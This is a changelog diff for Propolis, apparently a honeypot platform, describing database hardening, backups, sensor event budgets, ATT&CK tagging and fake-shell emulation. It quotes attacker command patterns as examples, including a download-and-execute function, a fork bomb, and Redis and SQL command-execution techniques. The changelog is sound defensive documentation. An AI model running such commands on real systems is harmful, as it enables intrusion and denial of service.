@@ -1,0 +1,2649 @@
+# Changelog
+
+## Unreleased
+
+### Upgrade note
+
+- **The ledger's append-only control did not bind the daemon's own role, and now can.** The
+  control is a revoke, and PostgreSQL does not apply a revoke to a table's owner. The daemon
+  connects as the role that ran the migrations, so it owned `event` and could grant itself
+  `UPDATE` and `DELETE` back or disable the chain trigger. Nothing changes on upgrade: a node
+  with one role runs as before and now logs this at every start. To close it, split the roles
+  once ([database roles](docs/operations/database-roles.md)): an owner role migrates
+  (`propolis migrate`, run by `upgrade.sh` through `/usr/local/sbin/propolis-migrate`) and the
+  daemon's role keeps `SELECT` and `INSERT` on the ledger and owns nothing.
+  `propolis-migrate --check` reports which state a node is in.
+- **The database roles can authenticate without passwords** where PostgreSQL is on the same
+  host: peer authentication over the Unix socket, with one identity map saying which account may
+  be which role ([procedure](docs/operations/database-roles.md#without-passwords)). Nothing in
+  Propolis had to change for it except `config-check.sh`, which looked a percent-encoded socket
+  directory in `DATABASE_URL`'s host position up as a host name.
+- **`config-check.sh` now warns when the daemon's database role can change the ledger**
+  (`ledger-owner`, `ledger-grants`). Every node that has not split its database roles gets the
+  `ledger-owner` warning, so a check that exited 0 exits 1 until the roles are split.
+- **Backups now check the ledger against earlier backups, and can stop.** Each set records the
+  ledger's chain head, and each run first looks up the heads earlier sets recorded. After a
+  database restore, or a rollback with `--with-database`, the next backup fails until you run
+  one with `PROPOLIS_BACKUP_ACCEPT_LEDGER_RESET=1`
+  ([why and what else it can mean](docs/operations/backup-and-restore.md#when-the-ledger-does-not-match-a-backup)).
+  Sets written before this release record no head and are not compared.
+- **A new single-role database on PostgreSQL 16 or earlier now migrates.** In a database named
+  `propolis`, migration 0004 revokes the owner's own `UPDATE`, `DELETE` and `TRUNCATE`, and
+  migration 0014's `LOCK TABLE event IN SHARE MODE` was then refused with `permission denied for
+  table event`. The daemon now lends itself `UPDATE` for the retry and puts the revoke back.
+- **Upgrade intake before the sensors** when they run on different hosts (a split deployment). An
+  intake that predates the shell reply field ignores it, so a reply a newer sensor records in the
+  meantime is dropped: the event is ingested without it and the console shows none for that
+  command. The same order applies to the cred sensor's connection and login summaries: an intake
+  that predates them scores one as a single event, so a flooder's volume count is low, and a
+  summary an old intake ingested stays counted once: nothing re-projects it. A rebuild of that
+  address's projection from the ledger (`rebuild_projection`) counts the summary as the events it
+  stands for, so the rebuilt score and the stored one disagree until the address is rescored.
+  The hash chain is unaffected. See
+  [split deployment](docs/operations/split-deployment.md#upgrading) and
+  [upgrade](docs/operations/upgrade-rollback-and-dr.md#upgrade-the-intake-side-before-the-sensors).
+- **Move the public-feed cron to `propolis-blocklist`** if you publish the feed. The upgrade
+  creates the account and `/var/lib/propolis/blocklist-status`; a root crontab keeps working,
+  with a warning, until you move it (steps in
+  [routine procedures](docs/operations/routine-procedures.md#stage-2---publish-to-a-public-repository-operator-cron)).
+  `install.sh` and `upgrade.sh` install the script and its README as a root-owned copy under
+  `/usr/local/lib/propolis/`, where `propolis-blocklist` can read it (a checkout under `/root` is
+  not readable by it); point the crontab at that copy. A root run records
+  the push marker by dropping to the status directory's owner, which needs `setpriv` (util-linux).
+  The script now also needs `perl` (Essential on Debian; install it on Fedora) to open each feed
+  file without following links or blocking; a host without it refuses with "perl is not installed".
+  The push marker moved there from `/var/lib/propolis/feed/.current.last_pushed`, so until the
+  first push after the upgrade `feed-push-stale` sees no push; with `PROPOLIS_OPS_FEED_PUSH_EXPECTED`
+  set it can page once if that push is more than the stale threshold away. Run the sync by hand
+  after upgrading to avoid it. The old marker file is no longer read and can be deleted.
+- **The first start on this version is slower on a large ledger** - core-scoring migrations `0021`
+  to `0026` build indexes on `event`, `ip_score` and `attack_tag` and fill the new hourly
+  roll-up table from the ledger, holding a lock that blocks writes to `event` (reads proceed)
+  while they run, before intake starts. On a ledger of 7.5M events plan on up to a few minutes
+  of extra start-up `[estimated from 1,500,000 events: about 6 s per index build and a few
+  seconds for the roll-ups]`; later starts are unaffected. See
+  [schema and migrations](docs/development/schema-and-migrations.md#index-builds).
+
+### Added
+
+- **`propolis-watch --journal` follows the PostgreSQL server too** - the fixed `journalctl`
+  vector gained `-u postgresql*` (Debian's `postgresql@<version>-<cluster>`, the vendor
+  `postgresql-<version>`, the plain `postgresql`), so a daemon stall can be set beside what the
+  database logged. The vector is still constant and read-only. The
+  [database reference](docs/reference/database.md#server-settings-that-make-a-stall-attributable)
+  now names the `postgresql.conf` settings that make a stall attributable
+  (`log_min_duration_statement = 500ms`, `log_lock_waits`, `log_checkpoints`,
+  `log_autovacuum_min_duration = 1s`) and the journal caveat on Debian.
+- **A runtime scheduling-lag probe, and a harness that times the steps behind it** - the daemon
+  now sleeps 100 ms at a time and logs one WARN (at most one per 10 s) when it was polled more
+  than 250 ms late, with the worst lag, the late wake-up count, the worker count, the queued
+  task depth and the process cgroup's CPU-throttle and memory-reclaim growth since the last healthy wake-up
+  (a `CPUQuota=` or `MemoryMax=` stall looks identical to a blocked worker without them). A stall
+  inside the 10 s window is held and reported by the next wake-up after it, or at shutdown. Slow
+  statements logged around that warning are the process, not the database; without it
+  they point at the database. It is not a supervised subsystem, so it never pages or restarts
+  anything. `cargo run --release --example cpu_budget -p propolis` times the
+  synchronous steps the daemon runs on async workers on inputs at the limits it enforces (a 1 MiB
+  line, an 8 MiB intake batch, a 16 MiB body, a 20,000-file spool, a 200-event evidence page of
+  64 KiB bodies, a 50,000-entry published feed) and flags any over 10 ms that still run on a
+  worker. The console's evidence page and feed Entries tab, 225 ms and 165 ms in the worst case,
+  now run off the async workers. See
+  [runtime scheduling lag](docs/operations/health-and-observability.md#runtime-scheduling-lag).
+- **Per-source budget for the cred sensor's connection and login events** - the VNC listener
+  wrote about 10,000 lines an hour for 42 hours (392,838 events from 1,629 addresses) and filled
+  the log volume; a VNC attempt is a DES challenge-response, so each carried little beyond its
+  source. Every cred listener (vnc, mysql, mssql, postgresql, mongodb) now writes at most 10
+  `honeypot_connection` and 10 `honeypot_login_attempt` events per source address per 10 minute
+  window, 40 of each per source network (/24 or /56) and 200 repeats of each per listener; an
+  address's first event of each kind in a window does not spend the listener budget (its address
+  and network budgets, and the table, still apply), so a source seen once is written unless its
+  network has already spent 40, its network already holds 64 tracked addresses, or the table is
+  full. One network holds at most 64 of the 1,024 tracked addresses per
+  window and its further addresses are counted into one summary for the network, so a single /24
+  or IPv6 /56 cannot fill the table (`SourceEventGate` in `sensor_framework::source_flood`,
+  attached to the listener's `EventEmitter`). The rest is counted into one event per address per
+  window marked
+  `event_summary: true` (a `honeypot_login_attempt` when an attempt was folded, else a
+  `honeypot_connection`) with `suppressed_count`, `suppressed_connections`, `suppressed_attempts`,
+  up to 8 distinct `client_versions` and `usernames`, `first_seen`, `last_seen` and
+  `session_count`, written when the window ends and at shutdown. Past the budget an address's
+  individual events and the usernames beyond the first 8 per window are not kept; passwords never
+  were. Scoring counts an address's summary as the events it replaces in `event_count` and
+  `established_event_count` (weight is one sighting). The overflow and per-network summaries,
+  marked `overflow_summary: true`, stand for many addresses but are attributed to one: they are
+  written as a `honeypot_connection` with `authenticated: false`, and scoring counts them as one
+  event with no weight and no confirmed-real latch. The volume-list threshold arrives as
+  before: `core_scoring::scoring::engine::represented_events`, with a differential test against
+  the unbounded stream. The console timeline reads "N events summarized". The VNC
+  `honeypot_login_attempt` now carries `client_version`. postgresql's query events go through the
+  shell sensors' command-event budget (defaults), which closes its missing command-event limit.
+  No new variable. See
+  [sensor-behavior](docs/reference/sensor-behavior.md#connection-and-login-event-budget-cred),
+  [events-and-signals](docs/reference/events-and-signals.md#connection-and-login-summary-keys) and
+  [rate limits](docs/reference/rate-limits-and-budgets.md#cred-connection-and-login-event-budget-vnc-mysql-mssql-postgresql-mongodb).
+- **The upgrade pull is checked before it is built as root** - `upgrade.sh` did a plain
+  `git pull`, so whatever the remote served, or whatever had been edited or committed on the
+  box, was built and installed. It now refuses a dirty checkout (naming the files), a remote
+  that differs from the one the last deploy recorded in the deploy stamp (new `origin_url`
+  field; `--accept-origin` records a deliberate move, and a box with no record yet records
+  it), and a commit `origin/main` does not have, and it only fast-forwards. Opt-in signature
+  verification: with `/etc/propolis/upgrade-signers` (an SSH allowed-signers file, a regular
+  file, root `0644`) present, `origin/main` must carry an SSH signature by a listed key; the
+  PGP and X.509 backends are disabled for that check, so a PGP-signed commit (a GitHub
+  web-interface merge) is refused whatever keys the owner's keyring holds. `origin/main` is
+  resolved once after the fetch and the checks and the merge all name that commit. The origin
+  the stamp records is handed over from the pull rather than read again as root (git refuses
+  root a checkout it does not own unless `SUDO_UID` names the owner), and a stamp that
+  recorded an empty origin is refused until `--accept-origin` records one, instead of leaving
+  the check unarmed. The checks hold against the remote and operator mistakes, not against
+  the checkout's owner, which builds what root installs; the residuals are in
+  [residual risks](docs/security/residual-risks.md#deploying-from-the-repository). See
+  [what the pull trusts](docs/operations/upgrade-rollback-and-dr.md#what-the-pull-trusts).
+- **`config-check.sh` reports an env file other accounts can read or write** - a new `env-mode`
+  failure for any `/etc/propolis/*.env` whose mode is looser than `0600` (`0640` for
+  `watch.env`, whose group reads it by design; `0644` for the generated `fleet-listeners.env`),
+  with the `chmod` that closes it as the fix line. A stricter mode is not reported. The
+  sensor units now deny themselves these files by mount, but nothing covers a shell account
+  or an unrelated service on the host; the mode is that wall, and this is the check on it.
+- **Nightly backups** - `propolis-backup.timer` now runs the documented backup every night at
+  03:30: a `pg_dump` of the database and an archive of the spool, `/etc/propolis` and the SSH
+  host key, with digests, under `/var/backups/propolis` (newest 7 kept). With age public keys in
+  `/etc/propolis/backup-recipients.txt`, sets are stored encrypted only. A run refuses when the
+  disk cannot hold it, leaves nothing behind when it fails, and records its result in
+  `/var/lib/propolis/backup-status`. The database password reaches `pg_dump` through libpq's
+  environment (`propolis pg-exec`), never a command line. `install.sh` and `upgrade.sh` install
+  and enable it. See [backup and restore](docs/operations/backup-and-restore.md#the-nightly-backup).
+- **Rollback** - `upgrade.sh` now backs the database up and keeps the running release (binaries,
+  unit files, helpers, deploy stamp) before it installs anything, and `deploy/rollback.sh` puts
+  a kept release back. `--with-database` also restores the pre-upgrade dump, for an upgrade
+  whose migrations the older daemon refuses; it renames the current database aside rather than
+  dropping it. See [rollback](docs/operations/upgrade-rollback-and-dr.md#rollback).
+- **Alerts that survive the daemon dying** - every Propolis unit now names
+  `OnFailure=propolis-alert@%n.service`, which posts "`<unit>` failed" with its last journal lines
+  to the ops ntfy topic (or the journal), at most once per unit per 30 minutes. The monitor can
+  ping an external dead-man's switch after every complete round (`PROPOLIS_OPS_HEARTBEAT_URL`),
+  so a dead host or a wedged monitor still reaches you. A new `backup-stale` condition pages when
+  the last good backup is older than 36 h. `config-check.sh` reports backup, alerting and clock
+  state. See [health and observability](docs/operations/health-and-observability.md#when-the-daemon-or-the-host-is-down).
+- **Off-host backup copies** - a machine you choose pulls each encrypted nightly set over a
+  dedicated SSH key whose forced command (`propolis-backup-serve`, account
+  `propolis-backup-pull`) can only list and send encrypted sets; a plaintext set never leaves
+  the box. `deploy/backup-pull.sh` fetches the newest set, checks every digest before keeping it,
+  and keeps the newest 14. See
+  [off-host copies](docs/operations/backup-and-restore.md#off-host-copies).
+- **ATT&CK tags for the database sensors' commands** - the SQL the `postgresql` sensor records and
+  the commands the `redis` sensor records are now tagged, by a SQL reader of its own
+  (`crates/review/src/attack/sql.rs`: case-insensitive, quote- and comment-aware, no substring
+  matching, dialect taken from the sensor) and ten new rules: account password change,
+  privilege change and account creation (T1098, T1136), OS commands through `COPY ... PROGRAM`,
+  `xp_cmdshell` and `sys_exec` (T1059), version and user discovery (T1082, T1033), server-side
+  file reads (T1005), and Redis `CONFIG SET dir|dbfilename` aimed at cron or `.ssh` and `SLAVEOF`
+  (T1053.003, T1098.004, T1105). A tag's token is built from keywords only, so a password in the
+  statement never reaches `attack_tag`. No migration. The `mysql` and `mssql` sensors record no
+  statements, so their dialects are read only if a scanner sends them to the PostgreSQL port. See
+  [ATT&CK tagging](docs/reference/attack-tagging.md).
+- **ATT&CK techniques on the address and campaign pages** - the per-address page gets an "ATT&CK
+  techniques" panel (each rule that tagged a technique and the token it matched) and technique
+  chips in each session card's header; the campaign list shows chips under each campaign and a
+  campaign's page the same panel. Built from the existing `.sev` chip and panel components, with
+  attacker tokens escaped. No migration; the tags were already written by the campaign indexer.
+- **The evidence timeline shows what the shell answered** - the sensor now records a command's
+  reply (what the line printed, sanitized per line, at most 4 KiB, with its length and a
+  truncation flag) on the command event. Intake folds `output_sha256`, `output_len` and
+  `output_truncated` into the event's metadata, so the hash chain covers them, and stores the text
+  once per digest in the new `shell_output` table (migration `0018`, additive; the ledger never
+  holds the text). It refuses a line whose digest is not the text's. The timeline folds the reply
+  under its command in the existing raw expander, escaped. Commands recorded before this, and
+  lines left waiting for input, show none. On a synthetic mix of 1000 bot sessions the table held
+  one row per 3.9 replies (5.1 times fewer bytes than the replies themselves). A reply the
+  database refuses is accounted like a refused append of its line (wedge report, then quarantine);
+  replies are stored in digest order so two runners cannot deadlock. The daemon's hourly
+  `sample-retention` pass deletes replies no event names after 24 hours (migration `0019` adds
+  `last_stored` and a partial index on `event`), and `/metrics` reports
+  `propolis_shell_output_rows` and `propolis_shell_output_bytes`. The growth bound is in
+  [retention](docs/operations/retention.md#stored-shell-replies).
+
+- **A multi-line command is kept as its lines** - SSH exec and the interactive shells recorded a
+  script such as `cd /tmp` / `wget ...` / `sh x` as one line, because the sanitizer folds every
+  line break into a space. A command that had a break now also carries `metadata.command_lines`
+  (each line sanitized, blank lines kept, at most 64 lines and 1024 bytes together, with
+  `command_lines_truncated` when anything was left out). `command` is unchanged, so the campaign
+  indexer, the ATT&CK rules and the fingerprints are unaffected. The evidence timeline renders the
+  lines as a numbered list in place of the fused text; events recorded before the key existed, and
+  single-line commands, show what they showed. No migration: it is an additive metadata key on new
+  events only.
+- **Sensor capture counters reach `/metrics`** - the capture hand-off counters and the
+  capture-memory budget each sensor kept only in its own process (queue drops, spool refusals,
+  truncated and refused captures, budget current, high-water and refusals) are now written by the
+  six capturing sensors (ssh, telnet, adb, ftp, mqtt, tftp) as a `sensor_stats` line to their
+  event log every 60 s and once more, with `final` set, at shutdown. It is not an event: its
+  `source_ip` is the sentinel `0.0.0.0`, intake takes it out before conversion and keeps the latest
+  per sensor in a new `sensor_stats` table (`fleet` migration `0002`, additive), so it never
+  reaches the ledger, a score, the feed, a campaign or a vendor submission. Intake refuses, as a
+  rejected line with a WARN, a `sensor_stats` line from any other source, with other than the
+  fixed field set, with a value over 2^53, or naming a sensor other than the log's label. The
+  console publishes the values on `/metrics` as `propolis_sensor_capture_*` series labelled by
+  sensor, with `propolis_sensor_stats_age_seconds`, `_stale` (past 180 s) and `_final`, so a dead
+  sensor reads as stale, not as zeros. No new setting.
+- **The evidence timeline shows what the fetcher did with each download** - a
+  `honeypot_file_download` event now carries a line under its URL: `fetched` with the sample
+  hash linked to its page, `refused` (the SSRF guard or hop limit) or `failed` with the recorded
+  reason, `gave up after N attempts`, `pending`, or `not fetched` for a scheme outside the
+  fetcher. The outcome is the URL's current `fetch_attempt` record, matched by the fetcher's own
+  `url_hash`, so a later reporter's download shows the capture the first reporter's produced.
+  Reasons are length-capped and escaped. A failed lookup names "download outcomes" in the
+  page's degraded banner. The "URLs this IP tried to fetch" panel shares the classifier and
+  shows a guard rejection as refused.
+- **ATT&CK technique tags on sessions, sources and campaigns** - deterministic rules over exact
+  evidence, no model: a shell line is parsed into commands and a rule reads a command's name,
+  operands and redirection targets, so `echo crontab` and a URL containing `cron` are not tagged.
+  Eighteen rules cover brute force (the `ssh_brute_force` signal), ingress tool transfer (downloads,
+  `wget`/`curl`/`tftp`/`ftpget`, uploads), Unix shell, cron, systemd units, rc scripts, authorized
+  keys, system, file and process discovery, permission changes, file deletion, miner indicators
+  and impaired defenses. Each tag keeps its rule, the event and the matched token. Checked against
+  ATT&CK Enterprise v19.2, which moved Impair Defenses: security-tool kills are T1685 and firewall
+  flushes T1686. T1078 and T1110.001 are not tagged (the honeypot accepts every credential and
+  stores no password). Migration `0017` adds `attack_tag`, `campaign_attack_tag` and
+  `campaign_session.attack_pending`; a command-sequence campaign carries the union of its runs'
+  tags. Read through `review::attack::{campaign_tags, source_tags, session_tags}`; the console
+  does not show them yet. No backfill: events indexed before the migration are tagged by the full
+  rebuild. Not published to the feed or to vendors.
+  See [ATT&CK tagging](docs/reference/attack-tagging.md).
+- **Miner and test-key indicators from captured artifacts** - found in a mobile dropper
+  analysed 2026-10-08. A script URL on `coinhive.com`, `coin-hive.com` or `authedmine.com`
+  (under `/lib/`) is a URL indicator labeled `CoinHive miner script`; a `CoinHive.Anonymous(` or
+  `CoinHive.User(` call is an embedded-credentials flag `CoinHive site key`, never the key
+  itself; and a zip carrying the public AOSP test key certificate (SHA-256 `A4:0D:A8:0A...:F5:DC`)
+  is an RSA-key indicator naming it. The certificate is seen when it is stored uncompressed, as
+  in the APK Signing Block of v2 and later, and inside a deflated `META-INF/*.RSA` entry of a
+  v1-signed APK, which is inflated in memory up to 256 KiB (a signature block is a few KiB).
+  No schema change: the three reuse existing indicator kinds.
+- **CI lints the shell scripts** - a `shellcheck` job (the v0.11.0 image, pinned by digest) runs
+  over `deploy/*.sh` and `scripts/**/*.sh`. Its nine findings in `deploy/config-check.sh` and
+  `deploy/logrotate-guard.sh` are fixed or annotated in place with the reason.
+- **Telnet closes the door on a source whose infection finished** - Mirai-family loaders repeat
+  the identical infection every 60-90 s for as long as the target answers (one source: 14
+  identical sessions, 252 events in 22 minutes), because a real device's bot replaces telnetd and
+  the port closes. When a telnet session ends having run a file it fetched (`wget`, `curl`,
+  `tftp`, `ftpget`) or assembled from typed bytes natively, the sensor resets new connections
+  from that source (an IPv4 address or an IPv6 /64) for `PROPOLIS_TELNET_INFECTED_HOLD_SECS`
+  (default 21600; `0` turns it off; malformed or above 604800 refuses to start). A build for
+  another CPU (Exec format error), a download never run and an assembled downloader that cannot
+  reach its server do not count, so a per-architecture loop is held only once its native build
+  runs. The first session is recorded as before; refusals are counted per source and summarized
+  in one journal line a minute. The table holds 4096 sources and a restart clears it. The
+  handshake still completes before the reset (a closed port answers the SYN with an RST).
+  `FakeShell::infection_completed` exposes the signal to any sensor.
+- **A log line the database always refuses is quarantined and intake moves on** - such a line
+  (a NUL in a captured command, which `jsonb` cannot hold, for one) used to hold its sensor's
+  intake at that line until an operator edited the log. After the same line is refused on three
+  polls in a row, for a reason that is the line's own (never a lost connection), intake appends it
+  to `/var/lib/propolis/quarantine/<sensor-label>.jsonl` (`PROPOLIS_QUARANTINE_DIR`; sensor, log
+  path, byte offset, SHA-256, SQLSTATE, a capped error, and the line itself, base64 when it is not
+  UTF-8), fsyncs the record, and only then moves past exactly that line and saves the cursor. If
+  the record cannot be written, or the directory is at its cap (64 MiB, 10,000 records), intake
+  stays on the line and the `intake-stalled` text says why. New ops alert `intake-line-quarantined`
+  (the monitor now has sixteen conditions), a `propolis_intake_lines_quarantined_total` counter on
+  `/metrics`, and a WARN log line in both the daemon and the standalone `intake`.
+  `deploy/provision.sh` creates the directory; `deploy/intake.service` gains it as an optional
+  `ReadWritePaths` entry. The directory is never cleaned automatically.
+- **The fake shell runs functions** - `f() { wget URL; chmod +x x; ./x; }; f` used to define
+  nothing and run nothing ("parse and are skipped with status 0"), which a bot could tell from a
+  real shell. Definitions (`name() body`, and bash's `function name [()] body`) are stored and
+  calls run the body with its own `$1`..`$n`, `$#` and `$@` (`$0` unchanged), `local` variables,
+  no enclosing loop for `break`, and `return [n]`; a function answers before a builtin or a
+  file, and `command`, `builtin`, `env` and `sh -c` do not see it. Redirections on the definition
+  apply at each call, a subshell, pipeline stage or `$( )` gets a copy and loses what it
+  defines, and `type f`, `command -v`/`-V`, `unset -f`, `export -f` (bash), `$FUNCNAME`,
+  `FUNCNEST` and `set` follow each shell: bash prints the parsed body in its own layout, dash only
+  says `f is a shell function`. dash refuses the special builtins (`:`, `set`, `export`,
+  `return`, `local` ...) and any name that is not an identifier as
+  `Syntax error: Bad function name` before running the line, and has no `function` keyword; bash
+  takes any literal word and needs a compound body. A download inside a called function is now an executed fetch, reported
+  with the URL it expanded to, and a function defined and called on one line is one event; a
+  definition never called is still reported from its text. Recursion is capped at 10 running
+  functions and every call costs the line 256 steps of its work allowance, so a fork bomb
+  `:(){ :|:& };:` returns at once in bash (dash refuses the name `:`). Past the cap dash says
+  `Maximum function recursion depth (1000) reached` and exits 2; bash, which has no limit without
+  `FUNCNEST` and dies of a stack overflow without a word, ends the line with status 139 and keeps
+  the session; `FUNCNEST=N` gives `f: maximum function nesting level exceeded (N)`. Up to 128
+  functions are held per shell and their text counts against the connection's content allowance
+  with the variables. Every reply was checked against Ubuntu 22.04's dash 0.5.11 and bash 5.1.16
+  in a container, and three session fixtures replay them. The grammar note that listed `case` as
+  skipped is corrected: only `[[ ]]`, `(( ))`, `coproc`, `$'..'`, `${x##*/}`, brace expansion,
+  `<<<`, arrays and process substitution are skipped now.
+- **`alias`, `unalias` and `shopt`** - bots hide commands behind aliases (`alias ls='ls --color'`,
+  `alias wget='wget -q'`), and the fake shell answered `alias: command not found`. An alias is now
+  text the lexer substitutes at command position while it reads, as a shell does: a value may hold
+  operators, quotes or a here-document, an alias is in force from the next line, a trailing blank
+  lets the next word be an alias, a name is not expanded inside its own value, and a quoted word, a
+  `case` pattern or a redirection target is no alias. bash lists sorted (`alias ll='ls -l'`) and
+  refuses names with a blank, quote, `$`, `/` or metacharacter (`invalid alias name`); dash lists
+  `ll='ls -l'` in the order of its 39-bucket hash table (checked on 47 names), takes any name,
+  expands in a script (bash does not, unless `shopt -s expand_aliases`) and recognises a reserved
+  word before an alias. `type`, `command -v` and `command -V` name an alias first. `shopt` keeps
+  and lists bash's 53 options and the 27 `set -o` ones with the reference container's defaults; only
+  `expand_aliases` changes what the shell does. Bounded: 128 aliases of 4096 bytes (names 255) per
+  shell, counted against the content allowance, and a text expands at most 64 aliases and grows to
+  at most 256 KiB. Replies are from bash 5.1.16 and dash 0.5.11 in the reference container; two
+  session fixtures replay them. The phone's mksh output is [inferred].
+- **`trap`** - the fake shell answered `trap: command not found`, which a bot that sets
+  `trap 'rm -f /tmp/x' EXIT` or `trap '' HUP INT` reads at once. Handlers are now kept, listed and
+  reset as bash 5.1.16 and dash 0.5.11 do (bash `trap -- 'CMD' SIGINT`, `-l`, `-p`, `DEBUG`/`ERR`/
+  `RETURN`; dash bare names, `bad trap`, no options), and the `EXIT` handler runs when the shell
+  ends: after `logout`/`exit`, at the end of a script, an SSH exec string, a subshell, a pipeline
+  stage or a command substitution, with `$?` kept unless the handler exits. bash's `DEBUG` handler
+  runs before simple commands and `ERR` after a failing one nothing tests; a signal a shell sends
+  itself (`kill -USR1 $$`) runs its handler. Handlers are text a bot supplies, so they are bounded
+  (4096 bytes, one per signal, counted against the content allowance). Two session fixtures replay
+  replies from the reference container.
+- **`exec`** - the fake shell answered `exec: command not found`. `exec` with redirections now
+  changes the shell's own descriptors for good (open for writing or reading, duplicate, close,
+  `read -u N`, `<&N`, `>&N`, `exec >/dev/null 2>&1`), a copy of a closed descriptor is `Bad file
+  descriptor`, a write to a closed one is a write error in the writer's words, and an interactive
+  prompt vanishes when standard error is redirected. `exec CMD` runs CMD in place of the shell: a
+  subshell, pipeline stage or command substitution ends alone, a script or the session ends with
+  the command (no `EXIT` handler), a command with no file behind it is `not found`, and an
+  interactive bash survives a failed `exec` where a script and dash do not. A download run through
+  `exec` is reported as one run any other way is. dash's wording for a redirection it cannot make
+  (`cannot create X: Directory nonexistent`, status 2) replaces bash's. Two session fixtures
+  replay replies from the reference container.
+- **`times`** - the fake shell answered `times: command not found`. It now prints the two lines of
+  CPU time bash and dash print (the shell's own user and system time, then its children's),
+  derived from the same process model `time` uses so the two agree: starting commands and `dd`
+  grow the children's figures, a subshell or a fresh `sh -c` starts at zero, bash refuses an option
+  with its usage line and dash prints microseconds. A session fixture replays the deterministic
+  cases from the reference container.
+
+### Changed
+
+- **No real address in the review tests** - the gatekeeper and the review queue hold every
+  reserved address first, so the Disabled, ScoreFloor, Cooldown and RateLimit holds and the
+  daemon's queue populate pass could only be exercised with a real, allocated address, which the
+  public repository must not carry. The `review` crate now has a test-only `test-public-ranges`
+  feature (off by default, enabled only by the crate's own `[dev-dependencies]`) that treats
+  203.0.113.0/24 as public inside `review::reserved`; those tests use that block. The feature
+  never reaches `cargo build`, `core_scoring::is_reserved_ip`, the blocklist feed or the
+  fetcher's SSRF guard, which keep treating the block as reserved; a test in
+  `crates/propolis/tests/production_features.rs` fails if the whole workspace's shipped
+  dependency graph enables it (cargo unifies features across a `--workspace` build), and
+  `review::reserved` refuses to compile the feature under the release profile, so `cargo test
+  --release` cannot leave such a binary in `target/release` for `install.sh` to copy.
+- **CI's token is read-only** - the workflow now declares `permissions: contents: read`, the
+  least a checkout needs. No job writes to the repository, comments or publishes, so a
+  compromised action or build script can no longer push, tag or alter a pull request with
+  the workflow's token. See [supply chain](docs/security/supply-chain.md#pinned-build-inputs-ci).
+- **A sensor cannot read the other units' secrets, whatever their mode** - each
+  `deploy/sensor-*.service` now lists every other unit's env file, `/etc/propolis/watch.env`
+  and `/etc/propolis/certs` under `InaccessiblePaths=`, so a compromised sensor process cannot
+  open `propolis.env` (database URL, console password, vendor keys, ntfy token), another
+  sensor's env file or the split deployment's mTLS keys even after a `chmod` slip on one of
+  them. The sensor still receives its own variables: systemd reads `EnvironmentFile=` before
+  it sets the namespace up. Every entry is `-`-prefixed, so a file absent on a sensor-only
+  collector box does not stop the unit. A test derives the list from every unit's
+  `EnvironmentFile=` and holds each sensor unit to it exactly, so a unit added later must be
+  denied to the others before it merges. See
+  [secret management](docs/operations/secret-management.md#where-secrets-live).
+- **Nothing in a unit's filesystem is executable but its own program** - every
+  `deploy/*.service` now sets `NoExecPaths=/` and nests back in, with `ExecPaths=`, only the
+  program its `ExecStart=` runs and the library roots it loads (`/usr/lib`, and `/usr/lib64`
+  where it exists: arm64 Debian and Ubuntu have none, so it is marked optional); the three
+  root-run script units (`propolis-alert@`, `propolis-backup`, `propolis-logrotate`) add
+  `/usr/bin` and the extra program each runs, and filter the mount syscalls so root cannot
+  undo the mounts. The backup unit also allows Debian's and Ubuntu's PostgreSQL wrapper
+  (`/usr/share/postgresql-common/pg_wrapper`, which their `/usr/bin/pg_dump`, `psql` and
+  `pg_restore` are symlinks to; noexec is checked on the resolved file, so `/usr/bin` alone
+  would have failed every nightly run there). Before, only the daemon's fetched-sample spool
+  was marked, so a captured upload or spool entry on a mount that had lost its `noexec` option
+  could be run by a compromised process. A test walks every unit and checks the named program
+  against its `ExecStart=`. Needs a merged `/usr` (every supported Debian, Ubuntu and Fedora
+  release) and the distro's own PostgreSQL client packages (not PGDG's `/usr/pgsql-<N>/bin`);
+  `age` and any other tool the backup runs must come from the distro package, not
+  `/usr/local/bin`. See
+  [filesystem protections](docs/security/filesystem-and-db-protections.md).
+- **Every long console list loads the rest the same way** - Attackers paged with First,
+  Previous and Next; Campaigns and a campaign's members stopped at 200 and 500 with "showing
+  the first N"; Samples and the Feed's Entries tables printed everything at once. Each now
+  shows its first load (500 addresses or members, 200 campaigns or samples) with one "Load
+  more" below it that appends the next load, the control the IP timeline and Search already
+  used. Each load continues from the last row shown rather than by offset, so rows added
+  meanwhile neither repeat nor go missing, and a row that disappears in between is reported
+  with a note to reload. Attackers no longer says which rows of how many are shown, only the
+  total.
+- **Every list sorts from the "Sort by" bar** - Attackers sorted from links in its column
+  headers, which are hidden when its table turns into cards on a phone, so it could not be
+  sorted there. It now has the bar Review and Campaigns use; choosing the active key again
+  reverses it.
+- **Every count is grouped in thousands** - the dashboard printed `29296` where Attackers
+  printed `29,296`. All counts, in tables, headings and tooltips, now read `29,296`.
+- **The orange severity rung is distinct from the amber one** - in Graphite and Cream "high"
+  and "attention" were within a few degrees of each other. High is now a clear orange
+  (Graphite `#e8883f`, Cream `#b4501a`) between the amber and the red.
+- **The SSH sensor keeps a payload streamed over the shell or an exec's stdin up to 16 MiB** -
+  `PROPOLIS_SSH_MAX_CAPTURED_BYTES` now defaults to `16777216`, the SSH spool's per-file cap, where
+  it was `1000000`. A live SSH worm's 6.6 MB Go binary had always been cut at exactly 1,000,000
+  bytes, so its hash matched nothing on VirusTotal (0/57); a first raise to 10,000,000 then cut a
+  miner on every attempt, so the cap is 16 MiB. The miner's own size is not known: its capture
+  recorded a `wire_size` of 10,027,008, which is the 10,000,000 limit rounded up to the 32 KiB SSH
+  packet the cut fell in, so it is only known to be larger than 10,000,000 bytes and may still be
+  cut at 16 MiB. The indicator scan reads up to the
+  same 16 MiB, so a body kept whole is not then shown "not scanned", and a sample's page names
+  that limit in the units of its size. SCP and SFTP uploads are kept to 10 MB, and the other
+  spooling sensors keep their 10 MB caps. A body over the limit is still cut there and recorded
+  with `truncated: true`; for an `exec_stdin` or `shell_stdin` capture its `wire_size` is a lower
+  bound (the bytes that had arrived when the input ended, the limit plus at most the one data
+  packet, at most 32 KiB, that crossed it; a `binary_shell_payload` records the full size), not
+  the transfer's size. An env file that sets the variable explicitly
+  keeps its value. The Samples list and a sample's page now say `truncated` for a sample a
+  sensor kept only a prefix of (the secondary line under its digest, and the page's first line),
+  from the same flag the address page already used. Samples captured before this stay as captured:
+  a sample cut at 1,000,000 bytes keeps its hash, size and `truncated` flag, and is not
+  re-captured or changed. The memory this can use is bounded by the capture budget, not by the
+  limit; the worst-case sum of the capture budget, the session pool and the output budget, 82.5%
+  of `MemoryMax`, is in
+  [capacity planning](docs/operations/capacity-planning.md#ssh-sensor-worst-case-memory) and held
+  under `MemoryMax` by a test. Telnet and adb keep `1000000`. The sensor runs two worker threads
